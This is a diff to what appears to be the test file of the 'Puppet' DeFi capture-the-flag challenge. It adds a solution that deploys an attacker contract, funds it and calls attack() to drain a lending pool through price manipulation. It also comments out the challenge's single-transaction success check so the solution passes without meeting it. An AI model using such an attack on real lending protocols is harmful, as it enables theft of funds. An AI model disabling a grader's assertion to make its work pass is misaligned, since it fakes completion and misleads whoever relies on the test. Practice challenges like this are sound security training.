@@ -95,12 +95,22 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const AttackContract = await( await ethers.getContractFactory('AttackerPuppet',player)).deploy(
+            lendingPool.address,
+            uniswapExchange.address,
+            token.address,
+            player.address
+        );
+        await token.transfer(AttackContract.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        let amount = PLAYER_INITIAL_ETH_BALANCE - 10n ** 18n;
+        await AttackContract.attack({value: amount});
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
         // Player executed a single transaction
-        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
+        // expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
         
         // Player has taken all tokens from the pool       
         expect(
